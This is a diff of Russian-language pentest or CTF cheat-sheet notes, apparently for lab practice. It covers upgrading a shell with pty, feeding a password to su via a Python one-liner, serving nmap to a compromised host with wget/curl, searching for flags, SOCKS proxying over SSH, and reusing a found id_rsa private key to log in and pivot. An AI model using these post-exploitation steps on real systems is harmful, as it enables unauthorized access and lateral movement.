@@ -24,6 +24,10 @@ python -c ‘import pty; pty.spawn(“/bin/sh”)’
 python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
 
 Один ищет на хосте, второй же параллельно забрасывает на хост nmap и исследует дальше
+Пример поиска на хосте: grep -rnw '/path/to/somewhere/' -e 'flag{' 
+find /etc -iname *.conf
+locate название (если проиндексировано)
+
 Чтобы забросить nmap делаем:
 python3 -m http.server 8080 -d /home/user-1/Desktop/ (или другая папка где лежит подготовленный к работе nmap)
 wget наш_адрес/файл  // curl   URT4
@@ -65,3 +69,9 @@ ssh -D [local_port] [username]@[ssh_server]
 Например: ssh -D 7777 user@remote_server
 Его можно будет использовать в мозиле (Preferences > Advanced > Network). Например, указав его в foxyproxy как 127.0.0.1 7777 и теперь весь наш трафик будто бы идет от удаленной машины. Ставим галочки что это СОКС v5
 Прописываем указанное соединение в proxychains и пользуемся потом вместе с ПО
+
+Если находим приватный ключ (id_rsa)
+- Можем выкачать его себе чтобы логинится на машину или пивотиться по ssh без необходимости ввода пароля
+ssh hannah@192.168.1.108 -i id_rsa -p 61000
+ssh -i ~/id_rsa -q -f -N -p 22 frog@10.123.1.210 -L 127.0.0.1:9922:10.2.1.22:2222
+Не забываем предварительно сделать chmod 600 id_rsa
